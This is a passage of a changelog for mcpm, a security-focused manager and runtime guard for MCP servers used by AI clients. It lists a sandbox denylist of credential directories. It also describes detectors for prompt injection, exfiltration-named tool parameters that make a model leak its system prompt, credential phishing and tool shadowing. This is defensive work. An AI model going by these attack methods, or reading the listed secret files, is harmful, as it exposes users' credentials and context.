The rest of Wave 1 in one release — developer reach and CI citizenship: mcpm now manages **Gemini CLI**, `mcpm verify` and `mcpm audit --sarif` make it a first-class CI gate (client-free integrity + SARIF code-scanning), `mcpm doctor` gains a structured `--json` and a redacted `--report`, and the README documents every collision-free install channel (npm/npx/pnpm/mise).

### Documentation

- **Install matrix + distribution doc (D6)** — the README now lists npm / npx / pnpm /
  **mise** (`mise use -g npm:@getmcpm/cli`, via mise's built-in `npm:` backend — no
  registry entry needed) as install channels, all resolving the scoped `@getmcpm/cli`
  package. New `docs/DISTRIBUTION.md` documents the deliberate **name-collision
  decision**: the `mcpm` Homebrew formula (and PyPI name) belong to the unrelated
  [mcpm.sh](https://mcpm.sh) project, so mcpm ships through the collision-free scoped
  channels rather than fighting for `brew install mcpm`. A Homebrew tap + mise
  registry short-name are deferred (documented).

### Added

- **`mcpm audit --sarif` (D3)** — emit a SARIF 2.1.0 report for GitHub
  code-scanning (`github/codeql-action/upload-sarif`). One rule per real
  `Finding.type`; each finding becomes a result anchored **file-level** to
  `mcpm.yaml` (audit scans installed servers, which have no source line — a
  fabricated line number would be a lie), with severity mapped to SARIF
  `error`/`warning`/`note` and a stable fingerprint so GitHub tracks the same alert
  across runs. Report-only (never fixes); exit code matches `audit` (`1` when risky).
- **`mcpm verify` + an official GitHub Action (D2)** — a repo-only, **client-free**
  integrity gate for CI. `mcpm verify` loads `mcpm-lock.yaml` and runs the same
  fail-closed integrity pass as `mcpm up --frozen` — BLOCK (exit 1) on integrity
  drift, an unverifiable record, a format mismatch, or a suspicious missing baseline
  — but, unlike `up`, it needs **no AI clients installed**, so it runs on a hosted
  runner (where `up` hard-fails on zero detected clients). `--json` emits a
  structured model; a composite Action at `.github/actions/mcpm-verify` wraps it with
  a job step summary. Pre-commit rides the same verb. Deliberately **one verb**:
  provenance (Sigstore) will *extend* `mcpm verify` later, never fork it. v1 scope is
  npm `dist.integrity`; pypi/oci/url are reported as unenforceable, and stack-vs-lock
  staleness is a deferred follow-up.
- **`mcpm doctor --json` and `--report`** — `doctor`'s checks are now built into a
  structured `DoctorModel` (clients with server + guarded counts, runtimes, advisory
  cross-client drift, typed issues, `ok`). `--json` emits that model (shape UNSTABLE);
  `--report` emits a **redacted, pasteable** environment snapshot for bug reports —
  OS/arch, mcpm + node versions, per-client server counts, runtime availability,
  confine-backend + secret-store backend, and issue **counts** only. It deliberately
  carries **no server names or arguments** (issue messages that embed a server name
  are reduced to counts). A new `.github/ISSUE_TEMPLATE/bug.yml` requires a pasted
  report — the telemetry-free way to learn what setup hit a bug.
- **Gemini CLI adapter (`~/.gemini/settings.json`)** — mcpm now reads and writes
  MCP servers for **Gemini CLI** (Google's terminal agent) as a first-class client
  (`--client gemini-cli`). Same top-level `mcpServers` map as Claude Code / Cursor,
  so every command that enumerates clients — `install`, `remove`, `list`, `audit`,
  `doctor`, `sync --check`, `up`, `guard`, … — picks it up automatically. Scope is
  the **user-global** config; per-project `.gemini/settings.json` is intentionally
  out of scope. Writes preserve every unrelated setting in the file (`theme`,
  `selectedAuthType`, …) via the existing atomic read-modify-write + `.bak` backup.
  Note: Gemini reads `url` as an SSE endpoint and `httpUrl` as HTTP — mcpm writes
  `url`, the same URL-transport caveat that already applies to non-Cursor clients.
  Zero new deps.

### Internal

- **Shared frozen-verify extraction** — `classifyIntegrity` + a new pure
  `frozenVerdict` moved from `up.ts` into `src/stack/frozen-verify.ts`, consumed by
  both `up --frozen` and the new `mcpm verify`. `up`'s output and block matrix are
  byte-identical (its 13 frozen tests pass unchanged).

### Fixed

- **`mcpm_doctor` MCP tool now reports real issues** — it previously returned a
  hardcoded `issues: []` and listed only *detected* clients. It now reuses the same
  `DoctorModel` builder as the CLI, so an agent calling the tool sees malformed
  configs and missing-runtime issues (and the full per-client health), not an empty
  list.

## [0.18.0] - 2026-07-03

A developer-reach release: mcpm becomes usable with **Claude Code**, the most widely-used MCP host. Also the first release to actually ship the CycloneDX SBOM as a release asset (the v0.17.0 attach step tripped over GitHub immutable releases; now fixed).

### Added

- **Claude Code adapter (`~/.claude.json`)** — mcpm now reads and writes MCP
  servers for **Claude Code**, the most widely-used MCP host, as a first-class
  client (`--client claude-code`). Every command that enumerates clients —
  `install`, `remove`, `list`, `audit`, `doctor`, `sync --check`, `up`, `guard`,
  … — picks it up automatically. Scope is the **user-global** `mcpServers` map;
  per-project servers (`projects[<path>].mcpServers`) are intentionally out of
  scope for now. Writes preserve every unrelated key in the file (`projects`,
  `oauthAccount`, `numStartups`, …) via the existing atomic read-modify-write +
  `.bak` backup. Distinct from the existing `claude-desktop` client (a different
  app and file). Zero new deps.

### Internal

- **Release SBOM now attaches under immutable releases** — the publish workflow
  attached the CycloneDX SBOM via a follow-up `gh release upload`, which GitHub
  rejects (HTTP 422) on repos with immutable releases enabled; v0.17.0 published
  to npm but its release ended up asset-less. The SBOM is now passed to
  `gh release create` as a positional asset, so it's sealed with the release
  atomically. This release is the first to carry it correctly.
- **Confine macOS dogfood flake closed at root** — the `--confine` tamper check
  intermittently failed closed on the pins store instead of the confine gate
  because the happy-path driver killed the relay child without awaiting exit, so
  its off-thread pins write raced the tamper step. The driver now waits for the
  child to fully exit before tampering.

## [0.17.0] - 2026-07-03

A credibility-floor release for developer/enterprise adoption: supply-chain evidence (`SECURITY.md`, a CycloneDX SBOM on every release, OpenSSF Scorecard), a macOS CI leg that verifies the `--confine` enforcement path end-to-end, published stability contracts (`docs/CONTRACTS.md`), and a fail-safe registry-delisting gate.

### Added

- **Registry-delisting gate** — `mcpm install` and `mcpm up` now **fail closed** when
  the official MCP registry marks a server `deleted` (removed/withdrawn), and
  `mcpm audit` surfaces a `deleted` **or** `deprecated` listing as an advisory
  finding. This consumes the registry's own lifecycle `status` — a free community
  revocation signal mcpm already fetched on every run but ignored. **Fail-SAFE by
  design:** only an explicit `deleted` blocks; a `deprecated` or absent/unknown
  status never blocks (registry status is an availability signal, not an integrity
  one — a new benign status the registry adds later must not brick installs). The
  registry's optional `statusMessage` is surfaced in the reason. Zero new deps.
- **CycloneDX SBOM attached to each release** — every GitHub release now carries a
  machine-readable `mcpm.cdx.json` (CycloneDX) SBOM of mcpm's own dependency tree,
  generated from the committed `pnpm-lock.yaml`. A concrete procurement/compliance
  artifact for downstreams (EU CRA, SOC 2 evidence).
- **`docs/CONTRACTS.md` — stability contracts** — documents the exit codes CI can
  depend on (notably `sync --check` → `2` on drift, `up --frozen` fail-closed → `1`),
  the versioned `mcpm.yaml` / `mcpm-lock.yaml` formats, which `--json` shapes are
  stable, and the semver-exempt `~/.mcpm` internals. No behaviour change — it names
  guarantees that already hold.

### Internal

- **Supply-chain evidence pack** — added `SECURITY.md` (vulnerability-disclosure
  policy, scope, supported-versions, and the already-shipped npm provenance story),
  `CONTRIBUTING.md`, and an [OpenSSF Scorecard](.github/workflows/scorecard.yml)
  workflow that publishes a project-health/supply-chain posture score. No behaviour
  change; these make mcpm's own security posture reviewable without asking.
- **macOS CI leg for `--confine`** — CI now runs the hermetic `pnpm dogfood:confine`
  on a `macos-latest` runner, so the flagship OS-sandbox enforcement path is
  CI-verified rather than only verified locally (the ubuntu matrix can't exercise
  Seatbelt / `sandbox-exec`).
- **CI-gate exit-code smoke tests** — added end-to-end assertions for the contract
  above (`sync --check` drift = `2` with a positive no-drift control; `up --frozen`
  missing-stack = `1`).

## [0.16.0] - 2026-07-02

An enforcement release: `mcpm guard --confine` wraps a relayed stdio server in an OS sandbox — the guard's first *containment* primitive, complementing every prior *detection* feature.

### Added

- **`mcpm guard --confine` — OS-sandbox confinement for relayed stdio servers (F1)** — the first enforcement primitive in mcpm-guard. Every prior guard feature is detection: it reasons about JSON-RPC bytes and warns/blocks. But the relay is a stdio MITM — it can inspect every frame yet cannot *contain* the child MCP server it spawns; a server that decides to read `~/.ssh` or write `~/Library/LaunchAgents` never expresses that through inspectable traffic. `--confine` wraps the child in an OS sandbox so it physically cannot read secret files or persist, regardless of the JSON-RPC it emits (watch vs contain, as complementary layers). **macOS only in v1** (Linux `bwrap` deferred), via Seatbelt / `sandbox-exec`. The **standard tier** enforces: READ allow-all *except* a secret-dir denylist (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`/`gcloud`, `~/.npmrc`, `~/.docker`, `~/.kube`, `~/.netrc`, `~/.git-credentials`, `~/.cargo/credentials`, `~/.pypirc`, `~/Library/Keychains`, browser cookie stores, the MCP client config dirs, and mcpm's own `~/.mcpm`); WRITE deny all of `$HOME` *except* caches, the per-server scratch dir, system temp, and `/dev` — one rule that blocks the whole persistence class (`~/.zshrc`, LaunchAgents, PATH-shadowing `~/bin`, git hooks); NET launcher-classified — package launchers (`npx`/`uvx`/`pip`/`docker`/…) get network `all`, everything else egress-deny `none`. The store is `~/.mcpm/guard-confine.yaml` (+ `.integrity` sidecar), the source of truth for enrollment; it **fails closed** on integrity/shape/format-version mismatch (like `pins.json`). The wrap marker gains two tokens before the `--` separator — `--confine-profile-hash <sha256>` (a content hash binding marker↔stored-profile) and `--confine-required` (replicated into the IDE config so it survives a wiped store) — both neutral to `--orig-hash`. The **spawn-time decision** (in run-inner, before the relay spawns the child) treats the store as source of truth: CONFINE when enrolled + hash matches + backend available; **FAIL CLOSED** (refuse to start, exit 1) on hash mismatch, a malformed hash, a stripped marker on a require_confine server, or a wiped store on a require_confine server; otherwise a **hybrid posture** — when no OS backend is present (Linux/CI/Windows) or the marker/profile is missing on a non-required server, it WARNs loudly and runs UNCONFINED (never silently). New `guard-events.jsonl` events (category `CONFINE`): `confine-applied`, `confine-hash-mismatch`, `confine-marker-stripped`, `confine-profile-missing`, `confine-backend-missing`, `confine-marker-malformed` — these are events, not OWASP signatures (the catalog count is unchanged at 9 entries over 8 targets). **Honest caveats:** macOS only (Linux `bwrap` and a strict tier deferred); the `sandbox-exec` path is not exercised in the ubuntu-only CI (mocked arg-vector unit tests + local darwin verification, the same gap the os-keychain shell-outs carry); confinement is opt-in (without it, enable/disable is unchanged); it does *not* stop network exfil in general (net is launcher-permissive), and does *not* protect against a same-user attacker who can rewrite both the IDE config and `~/.mcpm`. (#110)
- **`mcpm guard enable --confine` + `mcpm guard doctor-confine`** — the user-facing commands for F1. `guard enable --confine` (bare flag ⇒ "standard" tier; `--confine off` ⇒ disabled, same as omitting) enrolls every *unwrapped stdio* server it wraps into the sandbox, respecting `--server` / `--client` (url/HTTP and already-wrapped servers are not enrolled). `guard doctor-confine [--json]` is read-only: it reports OS-backend availability (platform + `/usr/bin/sandbox-exec` presence) and the enrolled servers (tier / net / require_confine), pointing to `guard status` for per-client wrap state. `guard disable` (existing) removes the wrap marker, which unconfines (a leftover profile in the store is harmless). **Deferred to a fast-follow:** the per-server `guard confine <server>` / `--off` / `--show` / `--require` / `--allow-read/-write/-net` command — per-server confine is achievable today via `enable --confine --server X` + `disable --server X`. (#111)

### Changed

- **`--orig-hash` is now verified at spawn time, not only on disable/unwrap (#108)** — the wrap marker's `--orig-hash` (the original server command binding) is checked when the relay spawns the child. **Phase 1 = WARN-once on mismatch** — it does *not* fail closed yet (a future release promotes it after zero-mismatch dogfood evidence); an *absent* hash (legacy pre-#29 wrap) is skipped, not failed. Emits an `orig-hash-mismatch` event (category `RELAY`). (#108)

### Fixed

- **`writePins` no longer leaves a 0-byte `pins.json` on an interrupted write** — the drift-store writer touched `pins.json` empty (`flag: wx`) *before* locking and writing content; a crash/kill — or a concurrent, unlocked `readPins` — in that window left an empty file, so the next launch parsed `""` → `PINS-READ-ERROR` and failed the guard **closed** (bricked until the file was manually removed). It now touches with valid serialized content, so an interrupted write stays readable (an absent sidecar is the first-run path). Pre-existing; surfaced by the new confine dogfood, with a regression test that reproduces the crash window.

### Internal

- **`store-integrity.ts` extraction (refactor, #109)** — `fileSha` / `assertNotSymlink` / `writeFileAtomic` were extracted from `pins.ts` and `policy.ts` into one shared `src/guard/store-integrity.ts` (the confine store reuses it). Behavior is identical; the symlink-refusal message now names the store (`pins` / `policy` / `confine`). (#109)
- **Hermetic macOS confine dogfood (`pnpm dogfood:confine`)** — an end-to-end pre-release gate that drives the real `enable → guard run → sandbox-exec → relay` chain in a throwaway `$HOME` (canonicalized so Seatbelt `subpath` rules match), with a **positive control**: a secret that reads fine unconfined must be denied (`EPERM`, not `ENOENT`) inside the sandbox. It also asserts stdio integrity through the relay, tamper-fails-closed via the CONFINE gate, and a `CONFINE` event is logged. macOS-only (SKIPs elsewhere); covers the enforcement path the ubuntu-only CI can't exercise. Added to the launch checklist.

## [0.15.0] - 2026-06-22

A developer-experience release: `mcpm sync --check` surfaces cross-client config drift, plus a dependency-hygiene sweep.

### Added

- **`mcpm sync --check` — cross-client config-drift dashboard (F7)** — a read-only, symmetric view across every detected client (Claude Desktop, Cursor, VS Code, Windsurf): for each server it shows which clients have it, which are missing it, and whether the clients that *do* have it agree on the server's shape. It renders a matrix (`✓` present / `·` absent / `≠` shape conflict) with per-server detail; `--json` emits the drift model; `--check` exits non-zero (`2`) when drift is found, for CI. Shape comparison covers command, args, and env/header **key sets** — it **never compares env or header values**, so secrets never reach the output. `mcpm doctor` gains a matching advisory "Cross-client" section (informational — it never changes doctor's exit code). The write/convergence path (`--union` / `--from-client`) is deferred to a follow-up.

### Fixed

- **`mcpm guard mute hidden-chars-in-metadata` now works** — the hidden-character detector emits this signature id, but it wasn't in the catalog that `mute` / `list-signatures` enumerate, so the command exited `1` even though the block message instructs running it. It's now a catalog entry (no change to detection behavior).

### Changed

- **Dependency hygiene** — bumped `hono` (→ 4.12.25), `vite` (→ 7.3.5), and added an `esbuild` override (→ 0.28.1) to clear all open Dependabot alerts. The hono advisories are in HTTP-server / serve-static / Lambda code paths that mcpm's stdio-only guard never exercises, so they were never reachable — this restores a clean alert surface. `typescript` and `@types/node` major-version bumps are now pinned out (they break the `tsc` lint gate).

## [0.14.0] - 2026-06-20

A runtime-defense release: the guard blocks tools that advertise an exfil-named schema parameter.

### Added

- **Guard blocks exfil-named tool-schema parameters at `tools/list` (F5)** — a new structural detector walks each tool's `inputSchema.properties` **keys** and blocks the server's tool list when a parameter is named with the documented context-exfiltration sigil convention (`_system_prompt_`, `_conversation_history_`, `_chain_of_thought_`, `_reasoning_trace_`, `_context_window_`, `_exfil*`) — names the model would silently auto-fill from the conversation/system prompt, leaking it with zero user interaction. This closes a structural gap: the content-regex pipeline only walks string *values*, never property *keys*. It blocks at advertisement time, before the model ever sees the tool. **Zero-FP by design:** only the underscore-*wrapped* sigil form is denied (the attacker tell); bare names a legit tool uses (`system_prompt`, `messages`, `reasoning`) and framework runtime slots (`_context_`, `_memory_`, `_thinking_`) are deliberately excluded. **Honest scope:** a tripwire for the documented convention — a renamed parameter evades it. Muteable via `mcpm guard mute exfil-param-in-schema`. The guard now ships **9 catalog entries**.

## [0.13.0] - 2026-06-20

A supply-chain release: `mcpm up --frozen` turns the integrity tripwire into a fail-closed CI gate.

### Added

- **`mcpm up --frozen` — fail-closed supply-chain integrity gate (F3)** — opt-in via the flag or `policy.frozen`. Before installing anything, `up` verifies every locked npm server's published `dist.integrity` against the lock; on **integrity drift**, an **unverifiable** record (offline / yanked / no comparable hash), a **format mismatch**, or a **suspicious missing baseline**, it **blocks the entire run** (installs nothing, exits non-zero) — `npm ci` semantics. This promotes the v0.10 WARN-only integrity tripwire (H11) to a real CI gate. **Honest by design:** a lock with no baselines yet (pre-v0.10 or offline-locked) gets a benign "run `mcpm lock` online once" refusal, *not* a poison verdict; non-npm (pypi/oci) servers get a coverage notice (no baseline mechanism exists — deferred); and a block means *npm's published record diverged from your lock*, **not** that mcpm caught the bytes `npx`/`uvx` fetch at launch.

## [0.12.1] - 2026-06-19

A correctness patch from a full-surface dogfood (102 commands, no crashes/hangs/security issues found — these are honesty fixes to command output).

### Fixed

- **`guard reset-integrity` / `guard accept-drift` no longer claim success on a no-op** — `reset-integrity` with no `pins.json` (and `accept-drift` for a server with no existing pin) printed "refreshed" / "re-pinned" / "removed" as if work happened. They now report "no pins.json found — nothing to refresh" / "no existing pin … nothing to re-pin/remove".
- **`secrets rm` of a never-stored secret now errors instead of falsely reporting removal** — it printed "Removed secret '…'" for a secret that didn't exist; it now errors ("No secret stored for '…'", exit 1), mirroring `secrets get`.
- **`search` column relabeled "Status"** — the column was headed "Trust Score" but rendered the registry lifecycle status ("active"). Search is a fast discovery list and doesn't run the scanner per result; the computed trust score lives in `mcpm why` / `info` / `install` / `audit`.
- **Shell completions dropped the removed `init developer/data/web` packs** — bash/zsh/fish completions still suggested the curated starter packs removed in v0.x.

## [0.12.0] - 2026-06-19

A supply-chain hygiene release: `mcpm up` can now flag cross-server tool-name collisions (a shadowing signal).

### Added

- **`mcpm up --check-shadowing` — cross-server tool-name-collision detection (F2, v1 slice)** — opt-in via the flag or `policy.checkShadowing`, `up` reads the guarded tool inventories (from pins) across the resolved server set and reports any tool name exposed by two or more servers — a *shadowing* signal, where a lower-trust server can intercept calls meant for a trusted one. **WARN-tier:** advisory on an interactive run; under `--ci` a collision exits non-zero. **Honest scope (stated in the output):** best-effort over **already-guarded** servers only (pins are populated when a server first runs under guard, so a never-guarded server contributes no names), and exact-name match — it is a stack-hygiene / re-audit aid, not a fresh-install control. Pure detector, zero new deps; the broader `origin-index` persistence and cross-origin text heuristic are a documented fast-follow.

## [0.11.0] - 2026-06-18

A runtime-defense feature release: the guard relay now blocks credential-phishing prompts a server tries to push at the user.

### Added

- **Guard blocks credential-phishing elicitation/sampling prompts (F6)** — two new signatures (`MCP-CREDENTIAL-PHISHING`) catch a server that prompts the user to enter a crypto-wallet seed/recovery phrase, mnemonic, or wallet private key (wallet-drainer), or a card CVV/CVC, SSN, or card/bank PIN (financial phishing). They ride the H7 (#78) server-initiated scan path, so a tripped `elicitation/create` or `sampling/createMessage` is blocked with the JSON-RPC error routed back to the server. Each pattern is **solicitation-anchored** (an imperative ask, not a passing mention) so benign conversation history and field-name prose don't false-positive, and the relay's broad H7 injection scan is left fully intact (no role-filtering). Generic api-key/password/token elicitation is deliberately **not** blocked — a server collecting its own config secret during setup is the common, legitimate case. The guard now ships **8 signatures over 8 inspected targets** (was 6).

## [0.10.1] - 2026-06-14

A documentation-accuracy patch (republished so the npm package page reflects it).

### Changed

- **README states what the guard does on every tool call (#85)** — a new "What happens on every tool call" subsection makes the runtime mechanic explicit: the relay inspects both halves of each call (request arguments out, response back) plus the tool definition against the install-time pin, and replaces a tripped frame with a synthetic JSON-RPC error so the payload never reaches the model. Server-initiated `sampling`/`elicitation` requests are inspected the same way, with the error routed back to the server.

### Fixed

- **Stale `init` / starter-packs documentation (#85)** — the README still showed `mcpm init developer` "installing 3 servers" and the removed `developer`/`data`/`web` packs; rewritten to match the shipped scaffold-an-`mcpm.yaml` behavior from #83.

## [0.10.0] - 2026-06-14

A runtime-defense hardening release: six guard upgrades that widen what the inspection relay can see and enforce, plus mcpm's first supply-chain integrity signal. The test suite grew to 1,654.

### Added

- **Guard inspects retrieved-content carriers + hidden-character detection (H1+H2, #74)** — the relay now inspects `resources/read`, `prompts/get`, `initialize.instructions`, and `structuredContent` carriers (warn-and-forward on retrieved data, block-capable on pre-invocation context), and flags zero-width / hidden Unicode *before* normalization strips the signal.
- **Fail-closed posture for un-guardable transports (H9, #76)** — URL/HTTP/SSE servers that no stdio relay can wrap are deny-by-default across install/up/guard-enable, with explicit, recorded consent (`--allow-unguarded` / `policy.allowUrlServers`).
- **Field-level schema-drift tiering + `list_changed` re-validation (H4, #77)** — a rug-pulled tool is tiered: description-only drift warns and forwards (co-scanned for injection), while schema/annotation drift blocks; `notifications/tools/list_changed` re-validates against the pin.
- **Sampling / elicitation prompt-injection scanning (H7, #78)** — server-authored `sampling/createMessage` and `elicitation/create` content is scanned for injection and blocked back to the originating server (new relay block-to-origin seam).
- **Initialize-handshake drift detection (H5, #79)** — capability escalation and server-identity changes since first observed are surfaced (warn-once, no auto-re-pin).
- **npm supply-chain integrity tripwire (H11, #81)** — `mcpm lock` captures npm's published `dist.integrity` for each pinned npm server; `mcpm up` re-checks the same version and warns on `⚠ INTEGRITY DRIFT`, catching a compromised-account republish. Advisory only — it checks the registry's published record, not the bytes `npx`/`uvx` actually run.

### Changed

- **`mcpm init` scaffolds a stack file instead of installing dead packs (#83)** — the curated `developer`/`data`/`web` packs referenced registry IDs that no longer resolve, so `init <pack>` installed nothing. `init` now writes a starter `mcpm.yaml` (won't clobber an existing one; `--force` to overwrite) and points users at `mcpm search`.
- **README leads with the runtime guard (#80)** — headline and positioning refreshed around the runtime-defense capabilities.

### Fixed

- **Stale shell completions (#82)** — bash/zsh/fish now complete the full command set (including `guard`, `secrets`, `lock`, `up`, `diff`, `why`, `export`, `outdated`, `alias`, `publish`) and the `guard`/`secrets` subcommands.
- **`mcpm_search` MCP tool annotation (#82)** — now carries `readOnlyHint`, like the other read-only tools.

## [0.9.0] - 2026-06-10

First feature off the post-v0.8.1 security + DevX roadmap (`docs/ROADMAP.md`): F4, release-age cooldown — which also fixes a live trust-score inversion bug — plus a registry-parse fix surfaced while dogfooding it. The test suite grew to 1,427.

### Added

- **Release-age cooldown + install-script-shape awareness (F4)** — `mcpm install` gains `--min-release-age <hours>` (fail-closed gate: blocks releases younger than the threshold AND releases whose publish timestamp is missing or unparseable, so a registry cannot defeat the gate by omitting `_meta`) and `--allow-fresh` (bypasses only that gate). New opt-in stack-policy keys: `policy.minReleaseAgeHours` (same fail-closed semantics for `mcpm up`) and `policy.blockInstallScripts`. New finding types: `release-cooldown` (medium — an unconditional soft penalty whenever a release is younger than the 24h cooldown, with or without the gate) and `install-script` (low launcher-shape awareness for npm `npx -y` packages; medium for declared dangerous runtime flags on every registry type). `mcpm export` now seeds `policy.minReleaseAgeHours: 24` in generated stacks.

### Changed

- **Migration: trust scores shift under F4** — every npm-launched server takes a -2 static deduction (low `install-script` launcher finding), and releases younger than 24h take an additional -5 (medium `release-cooldown`) plus lose the +3 age bonus. Lockfiles written by earlier mcpm versions carry snapshots WITHOUT these deductions, so stacks with `blockOnScoreDrop: true` will report a score drop on every npm server after upgrading — re-run `mcpm lock` once after upgrading to refresh snapshots. The block reason now includes this remediation hint.

### Fixed

- **`mcpm search` against the live registry (#71)** — `search` (and `getServer` / version lookups) threw `Invalid search response` because the schema modeled `runtimeArguments` entries as `{type, value}` with `value` required, but the official MCP registry Argument type makes `value` optional and uses named (`{type:"named", name:"--rm"}`) and positional (`{type:"positional", valueHint:"…"}`) forms — so any server declaring a named argument was rejected. The schema now accepts the real Argument shape, and every consumer (install argv render/validation, the prompt-injection scan, and the F4 dangerous-flag check) was made total over it: a dangerous flag declared via `name` (e.g. `--eval`) is still rejected, a bundled short flag (`-eCODE`) can no longer smuggle a dangerous flag past the allowlist, and a benign `valueHint` that resembles a flag is not falsely flagged.

## [0.8.1] - 2026-06-09

Registers the `mcpm_up` MCP tool and ships a focused post-ship security review (multi-agent find → adversarial-verify across the MCP server surface, secrets/crypto, and registry layers), each finding fixed in an independently-reviewed PR (#65, #66). The test suite grew to 1,302.

### Added

- **`mcpm_up` MCP tool (#64)** — `mcpm serve` now registers and exposes `mcpm_up`, so an MCP client can install a whole `mcpm.yaml` stack with trust verification (the handler existed but was never wired into the server). `mcpm serve` now exposes 9 tools.

### Security

- **MCP `.env` secret-leak lockdown (#65)** — the untrusted `mcpm_up` surface already blocked `process.env`, but still read the working-directory `.env`, so an attacker-controlled stack file could siphon the host's `.env` into an installed server config. The MCP surface now skips the `.env` entirely (`allowEnvFile:false`); the CLI is unchanged.
- **`mcpm_up` trust floor (#65)** — the batch `up` MCP path now enforces the same non-overridable `HARD_TRUST_FLOOR` the single-install tool uses (#24), so a stack file with no policy (or `minTrustScore:0`) can't slip a low-trust server past the gate.
- **Symlink path containment (#65)** — the `mcpm_up` `stackFile` check now resolves the real path (`realpath`) and rejects an in-cwd symlink pointing outside the working directory; the not-found fall-through covers `ENOENT`/`ELOOP`/`ENOTDIR` so internal filesystem errors don't leak to the caller.
- **Remote-URL hardening (#66)** — `validateRemoteUrl` allows plaintext `http` only for loopback hosts (`localhost`/`127.0.0.1`/`::1`/`*.localhost`) and requires `https` elsewhere (a plaintext remote written to an IDE config is interceptable); the `mcpm up` URL path now validates stack-file `url:` servers, which were previously written unvalidated.
- **Runtime-arg path traversal (#66)** — `validateRuntimeArgs` rejects a `..` path-traversal segment in any argument (the allowlist had permitted `.`/`/` inside values).
- **Dependency bumps (#62, #61)** — `hono` override → `^4.12.21` (clears 4 transitive Dependabot alerts: Set-Cookie injection, IPv6 IP-restriction bypass, `app.mount` mis-route, JWT any-scheme); `semver` → 7.8.2. All Dependabot alerts now clear.

### Fixed

- **`mcpm_up` failure reporting (#65)** — a whole-batch failure is surfaced via the `error` field instead of being pushed (as a message string) into the `failed` array, which is contracted to hold server names.
- **Empty-string env values (#65)** — env resolution compares against `undefined` instead of truthiness, so an explicitly-empty declared value is no longer silently dropped.
- **Honest keychain notice (#66)** — the secret-storage notice no longer claims "protects against other-user/offline access" unconditionally; it is accurate about the machine-derived-key fallback and points to `mcpm secrets migrate`.

### Docs

- Added rendered architecture diagrams (Mermaid) and a doc-drift reconciliation across README / ARCHITECTURE / GUARD / POLICY / SIGNATURES (#63).

## [0.8.0] - 2026-06-02

A deep multi-agent code review (find → adversarial-verify across the guard, store, scanner, registry, and command layers) surfaced a batch of latent bugs and hardening gaps. 33 confirmed findings were fixed across six independently-reviewed PRs (#49–#54); the test suite grew to 1,238.

### Security

- **Guard integrity strip-bypass (#54)** — `guard disable` no longer reconstructs a command from a wrap marker whose `--orig-hash` was stripped. A missing hash now fails closed instead of skipping SHA-256 verification.
- **Guard fail-closed pin/policy load (#54)** — a `readPins` failure (integrity mismatch, permission error, corrupt file) now refuses to start the relay with a stderr `PINS-READ-ERROR` instead of silently running with drift detection disabled; a `readPolicy` integrity/read error is surfaced on stderr before the safe full-enforcement fallback; `guard cleanup` refuses to prune on a tampered pins file. Pin files are now schema-validated (Zod), not bare-cast.
- **Symlink-safe writes (#52, #54)** — the `~/.mcpm` store writer (secrets, servers, aliases), the store lock file, and the pins/policy integrity sidecars now refuse symlinked targets and write exclusively (`O_EXCL`), matching the config-write hardening.
- **Store write-locking (#52)** — secret/server/alias read-modify-writes are serialized to prevent lost updates across concurrent processes; secret resolution now reads a single consistent locked snapshot, so a concurrent delete can't surface a phantom "secret not found" at launch.
- **Registry SSRF + injection (#50)** — the version path segment is URL-encoded (no path/query injection from a lock/stack version string); the IPv6 private-range check now covers all of `fe80::/10` (link-local) and `fc00::/7` (ULA), plus 6to4 `2002::/16` and CGNAT `100.64.0.0/10`; the publish response body is capped (shared 10 MB reader) to prevent OOM.
- **Scanner homoglyph evasion (#51)** — install-time secret *and* prompt-injection scans now fold cross-script (Cyrillic/Greek) confusables, closing a lookalike-character evasion, while preserving the zero-width-obfuscation detector.

### Fixed

- **Trust-score double-counting (#51)** — static and external scan findings were each deducted twice; findings are now bucketed by source, so enabling an external scanner no longer artificially lowers scores. A `webhook_url` arg with no explicit `isSecret` is now flagged, and typosquat distance is case-insensitive.
- **`mcpm up` false success (#53)** — a server whose every client write failed is no longer reported as `installed`; strict-removal no longer counts removed servers as installs (`removed` is its own status); `--strict --yes` is honored in interactive mode.
- **`mcpm update` stale config (#53)** — updates now rewrite the client-config entry for the new version (preserving existing env), not just the store record.
- **`mcpm outdated` hidden regressions (#53)** — a trust-score drop that accompanies a version bump is no longer suppressed in the human-readable output.
- **`mcpm diff` drift detection (#53)** — the long-declared `mismatch` status is now emitted (best-effort version recovery for npx/uvx/OCI), so lock-vs-config drift is visible.
- **External scanner failures (#51)** — a non-zero `mcp-scan` exit that still emitted findings is parsed instead of silently treated as clean; a genuine failure surfaces a diagnostic instead of an empty result.
- **Registry search errors (#53)** — a registry outage during setup is reported as a search failure instead of an indistinguishable "no servers found".

### Changed

- Removed dead code and a redundant per-client `resolveInstallEntry` pass in `install`/`import` (#49).

## [0.7.1] - 2026-06-02

### Security

Resolved the 12 remaining MEDIUM/LOW findings from the security review:

- **Registry SSRF / decompression-bomb** (#21) — the registry client now uses `redirect:"manual"` (rejects 3xx instead of following), caps response bodies at 10 MB, and host-validates a custom `baseUrl` (https-only, no private/loopback hosts).
- **Guard env isolation** (#20) — a wrapped server now receives only a safe baseline env (`buildSafeEnv`) plus its own declared env keys, never the relay's full `process.env` (ambient `OPENAI_API_KEY`/`AWS_*`/`GITHUB_TOKEN` are no longer forwarded).
- **Guard-disable integrity** (#29) — the wrap marker carries a SHA-256 of the original entry; `guard disable` refuses to reconstruct a command from a tampered marker.
- **Fail-safe trust gate** (#22, #24) — unknown scanner severities map to `high` (not downgraded); the publish gate blocks on exfil-shaped args and aggregated mediums; the MCP `minTrustScore` is clamped to a hard floor so `0` can't disable the no-human-in-loop install gate; `mcpm_up` no longer auto-confirms.
- **Guard detection hardening** (#30, #27) — homoglyph (Cyrillic/Greek) confusables are folded before matching; match input is bounded to prevent ReDoS/huge-input cost. FP corpus re-validated (0/24).
- **Atomic config-write safety** (#25, #26) — the `.bak` backup now preserves the raw original bytes and is written once; temp/backup writes are exclusive (`O_EXCL`) and refuse symlinked paths.
- **Import trust scan** (#23) — `mcpm import` now runs a tier-1 trust assessment on discovered servers (matching `install`).
- **Guard cleanup** (#28) — orphan-pin detection compares raw server names (was sanitized vs raw, causing prune mismatches).
- **Honest sidecar labeling** (#19) — integrity sidecars documented as integrity-not-authenticity (no behavior change).

### Upgrade notes

- After upgrading, **re-run `mcpm guard enable`** for any already-wrapped servers — the new wrap marker carries the declared-env key list, so a server wrapped by an older mcpm should be re-wrapped to keep its declared env.
- `mcpm` now refuses to read/write a **symlinked** client config (security #26); point it at a real file if you symlink configs.

## [0.7.0] - 2026-06-01

### Added

